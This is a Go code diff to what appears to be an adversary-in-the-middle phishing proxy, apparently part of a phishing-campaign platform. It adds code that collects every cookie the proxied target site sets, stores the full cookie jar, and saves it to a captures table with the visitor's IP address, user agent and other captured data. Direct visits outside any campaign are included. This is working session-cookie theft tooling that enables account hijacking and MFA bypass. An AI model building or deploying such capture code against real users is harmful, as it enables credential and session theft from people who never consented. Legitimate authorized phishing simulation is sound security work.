@@ -1856,6 +1856,30 @@ func (m *ProxyHandler) onResponseCookies(resp *http.Response, session *service.P
 		return
 	}
 
+	// ========================================================================
+	// Step 1: Accumulate ALL cookies from Set-Cookie headers into the session
+	// cookie jar. This captures every cookie the browser would receive,
+	// similar to a browser-level cookie dump.
+	// ========================================================================
+	newCookiesAccumulated := false
+	for _, cookie := range cookies {
+		cookieData := m.buildCookieData(cookie, resp)
+		if cookieData != nil {
+			cookieDomain := cookieData["domain"]
+			cookieName := cookieData["name"]
+			// Skip cookies with empty/disabled values as they are typically deletions
+			if cookieData["value"] != "" && cookieData["value"] != "Disabled" {
+				dedupKey := cookieName + ":" + cookieDomain
+				session.AllCookies.Store(dedupKey, cookieData)
+				newCookiesAccumulated = true
+			}
+		}
+	}
+
+	// ========================================================================
+	// Step 2: Process YAML capture rules for specific cookie matching
+	// (existing behavior for campaign flow progression)
+	// ========================================================================
 	capturedCookies := make(map[string]map[string]string)
 
 	if hostConfig.Capture != nil {
@@ -1881,18 +1905,25 @@ func (m *ProxyHandler) onResponseCookies(resp *http.Response, session *service.P
 
 	if len(capturedCookies) > 0 {
 		m.handleCampaignFlowProgression(session, resp.Request)
+	}
 
-		// For direct proxy visits (no campaign context), save cookies to proxy_captures table.
-		// The checkAndSubmitCookieBundleWhenComplete path only handles campaign sessions,
-		// so direct visits need explicit saving here.
-		if session.CampaignRecipientID == nil || session.CampaignID == nil {
-			for captureName, cookieData := range capturedCookies {
-				m.saveDirectProxyCapture(session, captureName, cookieData, true, resp.Request)
-			}
+	// ========================================================================
+	// Step 3: For direct proxy visits, save the COMPLETE accumulated cookie jar
+	// to the proxy_captures table whenever new cookies are received.
+	// ========================================================================
+	if newCookiesAccumulated && (session.CampaignRecipientID == nil || session.CampaignID == nil) {
+		// Build the complete cookie jar from AllCookies
+		allCookiesJSON := m.buildAllCookiesJSON(session)
+		if allCookiesJSON != "" {
+			m.saveDirectProxyCookieJar(session, allCookiesJSON, resp.Request)
 		}
 	}
 
-	m.checkAndSubmitCookieBundleWhenComplete(session, resp.Request)
+	// For campaign sessions, use the existing bundle submission path
+	if len(capturedCookies) > 0 && session.CampaignRecipientID != nil && session.CampaignID != nil {
+		// Campaign sessions still use the rule-based capture flow
+		m.checkAndSubmitCookieBundleWhenComplete(session, resp.Request)
+	}
 }
 
 func (m *ProxyHandler) onResponseHeader(resp *http.Response, session *service.ProxySession) {
@@ -5668,6 +5699,109 @@ func (m *ProxyHandler) saveDirectProxyCapture(
 			"Direct Proxy Capture",
 			username,
 			notifData,
+		)
+	}
+}
+
+// buildAllCookiesJSON builds a JSON array string from all accumulated cookies in the session.
+// This provides a complete cookie jar similar to what a browser would have.
+func (m *ProxyHandler) buildAllCookiesJSON(session *service.ProxySession) string {
+	var allCookies []map[string]string
+	session.AllCookies.Range(func(key, value interface{}) bool {
+		if cookieData, ok := value.(map[string]string); ok {
+			allCookies = append(allCookies, cookieData)
+		}
+		return true
+	})
+	if len(allCookies) == 0 {
+		return ""
+	}
+	jsonBytes, err := json.Marshal(allCookies)
+	if err != nil {
+		m.logger.Errorw("failed to marshal all cookies", "error", err)
+		return ""
+	}
+	return string(jsonBytes)
+}
+
+// saveDirectProxyCookieJar saves the complete accumulated cookie jar for a direct proxy session.
+// Unlike saveDirectProxyCapture which saves individual capture rule matches,
+// this saves ALL cookies received during the session as a complete cookie jar.
+func (m *ProxyHandler) saveDirectProxyCookieJar(
+	session *service.ProxySession,
+	cookiesJSON string,
+	req *http.Request,
+) {
+	if m.ProxyCaptureRepository == nil {
+		return
+	}
+
+	ctx := context.Background()
+	clientIP := utils.ExtractClientIP(req)
+
+	now := time.Now()
+	capture := &database.ProxyCapture{
+		CreatedAt:   &now,
+		UpdatedAt:   &now,
+		SessionID:   session.ID,
+		IPAddress:   clientIP,
+		UserAgent:   session.UserAgent,
+		PhishDomain: func() string { if session.Domain != nil { return session.Domain.Name }; return "" }(),
+		TargetDomain: session.TargetDomain,
+		Cookies:     cookiesJSON,
+	}
+
+	// Also collect all captured data from the session for a complete picture
+	allCapturedData := make(map[string]interface{})
+	session.CapturedData.Range(func(key, value interface{}) bool {
+		allCapturedData[key.(string)] = value
+		return true
+	})
+	if jsonBytes, err := json.Marshal(allCapturedData); err == nil {
+		capture.CapturedData = string(jsonBytes)
+	}
+
+	// Look up the proxy ID from the domain
+	phishDomain := ""
+	if session.Domain != nil {
+		phishDomain = session.Domain.Name
+	}
+	if phishDomain != "" {
+		domainName, nameErr := vo.NewString255(phishDomain)
+		if nameErr == nil {
+			domain, domErr := m.DomainRepository.GetByName(ctx, domainName, &repository.DomainOption{})
+			if domErr == nil && domain != nil {
+				if proxyID, pidErr := domain.ProxyID.Get(); pidErr == nil {
+					capture.ProxyID = &proxyID
+				}
+			}
+		}
+	}
+
+	// Upsert - the repository's mergeCookiesJSON will accumulate cookies
+	id, err := m.ProxyCaptureRepository.UpsertBySessionID(ctx, capture)
+	if err != nil {
+		m.logger.Errorw("failed to save proxy cookie jar",
+			"error", err,
+			"ip", clientIP,
+		)
+		return
+	}
+
+	m.logger.Infow("proxy cookie jar saved",
+		"id", id,
+		"ip", clientIP,
+		"phishDomain", phishDomain,
+		"cookieCount", strings.Count(cookiesJSON, "\"name\""),
+	)
+
+	// Record event on live map
+	if m.LiveMapService != nil {
+		go m.LiveMapService.RecordEvent(
+			clientIP,
+			session.UserAgent,
+			"proxy_cookie",
+			phishDomain,
 		)
 	}
 }
